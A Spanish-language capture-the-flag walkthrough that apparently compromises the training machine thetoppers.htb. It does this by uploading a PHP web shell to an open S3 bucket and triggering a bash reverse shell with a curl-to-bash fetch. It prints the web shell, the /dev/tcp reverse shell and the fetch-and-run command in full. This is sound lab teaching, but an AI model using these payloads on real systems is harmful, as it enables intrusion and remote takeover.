📋 Paso a Paso Detallado

1

Escaneo y Enumeración Tu Parrot

Escaneas la IP de la víctima para descubrir servicios. Encuentras el dominio thetoppers.htb y el subdominio s3.thetoppers.htb (bucket S3).

sudo nmap -sV <IP_VICTIMA>
gobuster vhost -w wordlist.txt -u http://thetoppers.htb
2

Explorar el Bucket S3 Tu Parrot

Usas awscli para listar el contenido del bucket. Descubres que es el webroot del sitio (contiene index.php). ¡Todo lo que subas será accesible desde el navegador!

aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
# → images/ .htaccess index.php
3

Subir Web Shell PHP Tu Parrot → Víctima

Creas un archivo PHP que ejecuta comandos y lo subes al bucket. Ahora puedes ejecutar cualquier comando en la víctima a través de la URL.

echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb

# Prueba: http://thetoppers.htb/shell.php?cmd=id
# → uid=33(www-data) ✓ RCE confirmado
4

Crear shell.sh Tu Parrot · Terminal 1

Creas el script de reverse shell. Este archivo se va a ejecutar en la víctima, pero le dice que se conecte a tu Parrot. Por eso la IP es la tuya.

echo '#!/bin/bash
bash -i >& /dev/tcp/TU_IP/1337 0>&1' > shell.sh

# bash -i → shell interactiva
# >& /dev/tcp/IP/ → envía output a tu máquina
# 0>&1 → también redirige el input
5

Montar Servidor Web Tu Parrot · Terminal 2

Conviertes tu Parrot en un servidor web temporal. Sirve los archivos del directorio actual. La víctima descargará shell.sh desde aquí. No cierres esta terminal.

# Ejecutar desde el directorio donde está shell.sh
python3 -m http.server 8000
# → Serving HTTP on 0.0.0.0 port 8000
6

Iniciar Listener Tu Parrot · Terminal 3

Netcat se queda escuchando en el puerto 1337. Cuando la víctima ejecute shell.sh, se conectará aquí y verás la shell. No cierres esta terminal.

nc -nvlp 1337
# → Listening on 0.0.0.0:1337
7

¡Disparar el Ataque! Navegador

Este es el momento clave. Visitas la URL y todo se encadena:

http://thetoppers.htb/shell.php?cmd=curl%20TU_IP:8000/shell.sh|bash

curl TU_IP:8000/shell.sh → la víctima descarga shell.sh desde tu servidor Python
| → pipe: pasa el contenido al siguiente comando
bash → ejecuta shell.sh en la víctima → conecta de vuelta a tu netcat

8

🏴 Flag Capturada Tu Parrot · Terminal 3

En la Terminal 3 (netcat) ahora tienes una shell interactiva de la víctima. Lees la flag y ¡máquina completada!
